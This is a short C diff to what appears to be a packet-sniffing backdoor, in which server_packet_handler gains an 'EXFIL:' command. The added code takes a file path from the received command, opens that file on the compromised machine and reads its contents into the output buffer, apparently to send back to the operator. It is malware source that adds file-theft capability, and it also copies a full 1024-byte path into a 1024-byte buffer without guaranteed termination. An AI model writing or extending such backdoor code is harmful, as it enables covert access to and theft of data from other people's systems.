@@ -614,7 +614,22 @@ void server_packet_handler(u_char *args, const struct pcap_pkthdr *header, const
     
     // If file exfil command
     if(strncmp(bd_command,"EXFIL:",6) == 0){
-        printf("EXFIL");
+        printf("%s\n", bd_command);
+        
+        char file_path[1024] = {0};
+        strncpy(file_path, bd_command + 6, 1024);
+        
+        printf("File path: %s\n", file_path);
+        
+        FILE *fp;
+        if((fp = fopen(file_path, "r")) == NULL){
+            strcpy(output, "File not found...");
+        }
+        else{
+            fread((void *)output, sizeof(char), MESSAGE_MAX_SIZE, fp);
+
+            printf("File content: \n%s\n", output);
+        };
     }
     else{ // Normal command
         
